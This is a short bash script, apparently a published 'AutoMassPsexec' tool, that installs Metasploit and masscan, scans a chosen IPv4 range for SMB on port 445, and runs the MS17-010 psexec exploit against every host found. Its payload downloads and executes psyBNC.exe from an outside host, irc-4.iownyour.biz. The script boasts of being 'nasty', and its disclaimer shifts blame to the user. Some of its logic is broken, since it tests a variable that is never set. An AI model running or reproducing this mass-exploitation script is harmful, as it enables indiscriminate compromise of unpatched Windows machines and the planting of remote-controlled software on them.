#!/bin/bash
echo exploit/windows/smb/ms17_010_psexec script by independent, DEPLOYING;
echo https://github.com/independentcod/AutoMassPsexec;
echo Twitter and Instagram: @independentcod;
echo Facebook: https://fb.me/remi.girard2;
echo LinkedIn: https://rebrand.ly/1091c;
echo ---DISCLAIMER--- I AM NOT RESPONSIBLE FOR ANY ACTIONS YOU MAKE WITH THIS PROGRAM. THE ONLY RESPONSIBLE PERSON IS YOU!;
sleep 5s;
echo Installing necessary files to run this nasty script.;
sudo apt update && sudo apt install git metasploit-framework libssl-dev -y;
service postgresql start;
msfdb init;
git clone https://github.com/robertdavidgraham/masscan.git;
cd masscan;
make -j8 && make install;
cd ..;
echo Installation step is done, now starting smb scanner...;
sleep 5s;
read -p 'IP Range to exploit? [ 1.0.0.0-1.255.255.255 ]' ip;
case $ready in
	Y) masscan -p 445 --range $ip --rate 10000 >smb.scan&
esac
sleep 1s;
echo PLEASE WAIT... Sleeping one minute, to populate vulnerable servers list...;
sleep 1m;
echo Starting attack on IPv4 range $1 ... This will take a while.;
for i in `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" smb.scan`; do msfconsole -q -x " use windows/smb/ms17_010_psexec; set payload windows/download_exec; set rhost $i; set URL http://irc-4.iownyour.biz/psyBNC.exe; set target 0; exploit; exit;" ; done
echo !!!THE END OF THE WORLD!!!;
